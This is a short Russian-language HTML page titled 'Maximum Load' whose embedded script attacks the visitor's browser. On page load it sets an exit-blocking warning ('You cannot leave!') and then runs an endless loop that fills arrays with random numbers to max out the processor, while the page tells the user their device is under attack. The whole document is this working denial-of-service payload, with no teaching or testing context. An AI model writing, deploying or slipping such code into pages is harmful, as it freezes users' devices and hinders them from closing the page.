<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Максимальная Нагрузка</title>
  <script>
    window.onload = function() {
      // Предотвращаем выход со страницы
      window.onbeforeunload = function() {
        return "⚠️ Нельзя выйти!";
      };

      // Супер нагрузка на процессор
      setTimeout(() => {
        while (true) {
          let arr = [];
          for (let i = 0; i < 50000; i++) {
            arr.push(Math.random() * Math.random() * Math.random());
          }
          console.log("💥 Грузим процессор...");
        }
      }, 10); // Почти мгновенно
    };
  </script>
</head>
<body>
  <h1 style="text-align: center; margin-top: 100px;">⛔ Нагрузка началась...</h1>
  <p style="text-align: center;">⚙️ Ваше устройство под полной атакой нагрузки.</p>
</body>
</html>
